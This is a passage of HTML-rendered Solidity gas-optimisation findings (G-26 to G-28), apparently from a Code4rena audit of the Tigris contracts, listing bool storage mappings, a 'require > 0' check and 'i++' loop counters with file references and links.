class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">304</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296</p>\n<h2 id=\"g26--using-bools-for-storage-incurs-overhead\" style=\"position:relative;\"><a href=\"#g26--using-bools-for-storage-incurs-overhead\" aria-label=\"g26  using bools for storage incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑26]  Using <code>bool</code>s for storage incurs overhead</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"201\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Booleans are more expensive than uint256 or any type that takes up a full</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// word because each write operation emits an extra SLOAD to first read the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// back. This is the compiler&#39;s defense against contract upgrades and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// pointer aliasing, and it cannot be disabled.</span></span></span></code></pre>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27</a>\nUse <code>uint256(1)</code> and <code>uint256(2)</code> for true/false to avoid a Gwarmaccess (<strong><a href=\"https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058\">100 gas</a></strong>) for the extra SLOAD, and to avoid Gsset (<strong>20000 gas</strong>) when changing from <code>false</code> to <code>true</code>, after having been <code>true</code> in the past</p>\n<p><em>There are 16 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"202\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowedAsset</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L32</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"203\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isTrustedAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_allowedAsset</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L22</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"204\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowedAssets</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L18</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"205\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowedAsset</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L12</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"206\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_isMinter</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Trading contract should be minter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">int256</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">accInterestPerOi</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L20</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"207\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isInit</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L9</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"208\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isMinter</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L9</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"209\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L29</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"210\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chainlinkEnabled</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isNode</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowedMargin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">paused</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L15</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"211\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowedVault</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L134</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"212\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_isTrustedForwarder</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L7</p>\n<h2 id=\"g27--using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" style=\"position:relative;\"><a href=\"#g27--using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" aria-label=\"g27  using  0 costs more gas than  0 when used on a uint in a require statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑27]  Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</h2>\n<p>This change saves <strong><a href=\"https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png\">6 gas</a></strong> per instance. The optimization works until solidity version <a href=\"https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94\">0.8.13</a> where there is a regression in gas costs.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"213\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not bridging&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L130</p>\n<h2 id=\"g28--i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" style=\"position:relative;\"><a href=\"#g28--i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" aria-label=\"g28  i costs less gas than i especially when its used in for loops   ii   too permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑28]  <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</h2>\n<p>Saves <strong>5 gas per loop</strong></p>\n<p><em>There are 21 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"214\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:                  </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">]; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">aEpoch</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">284</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">292</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">300</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">342</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span 